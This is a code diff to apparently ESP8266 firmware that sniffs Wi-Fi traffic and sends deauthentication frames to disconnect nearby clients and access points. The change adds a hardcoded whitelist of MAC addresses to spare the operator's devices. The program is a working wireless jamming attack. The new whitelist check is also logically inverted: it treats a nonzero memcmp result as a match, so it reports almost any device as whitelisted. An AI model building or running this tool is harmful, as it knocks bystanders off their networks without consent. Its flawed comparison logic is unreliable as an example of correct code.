@@ -12,6 +12,10 @@ extern "C" {
 #define MAX_APS_TRACKED 100
 #define MAX_CLIENTS_TRACKED 200
 
+// Put Your devices here, system will skip them on deauth
+#define WHITELIST_LENGTH 2
+uint8_t whitelist[WHITELIST_LENGTH][ETH_MAC_LEN] = { { 0x77, 0xEA, 0x3A, 0x8D, 0xA7, 0xC8 }, {  0x40, 0x65, 0xA4, 0xE0, 0x24, 0xDF } };
+
 // Channel to perform deauth
 uint8_t channel = 0;
 
@@ -52,6 +56,8 @@ int aps_known_count = 0;                                  // Number of known APs
 int nothing_new = 0;
 clientinfo clients_known[MAX_CLIENTS_TRACKED];            // Array to save MACs of known CLIENTs
 int clients_known_count = 0;                              // Number of known CLIENTs
+
+bool friendly_device_found = false;
 
 struct beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi)
 {
@@ -373,6 +379,14 @@ void promisc_cb(uint8_t *buf, uint16_t len)
   }
 }
 
+bool check_whitelist(uint8_t *macAdress){
+  unsigned int i=0;
+  for (i=0; i<WHITELIST_LENGTH; i++) {
+    if (memcmp(macAdress, whitelist[i], ETH_MAC_LEN)) return true;
+  }
+  return false;
+}
+
 void setup() {
   Serial.begin(115200);
   Serial.printf("\n\nSDK version:%s\n", system_get_sdk_version());
@@ -404,13 +418,19 @@ void loop() {
           if (aps_known[ua].channel == channel) {
             for (int uc = 0; uc < clients_known_count; uc++) {
               if (! memcmp(aps_known[ua].bssid, clients_known[uc].bssid, ETH_MAC_LEN)) {
-                Serial.print("DeAuth to ---->");
-                print_client(clients_known[uc]);
-                deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
+                friendly_device_found = check_whitelist(clients_known[uc].station);
+                if (friendly_device_found) {
+                  Serial.print("Whitelisted -->");
+                  print_client(clients_known[uc]);
+                } else {
+                  Serial.print("DeAuth to ---->");
+                  print_client(clients_known[uc]);
+                  deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
+                }
                 break;
               }
             }
-            deauth(broadcast2, aps_known[ua].bssid, 128);
+            if (!friendly_device_found) deauth(broadcast2, aps_known[ua].bssid, 128);
           }
         }
         wifi_promiscuous_enable(0);
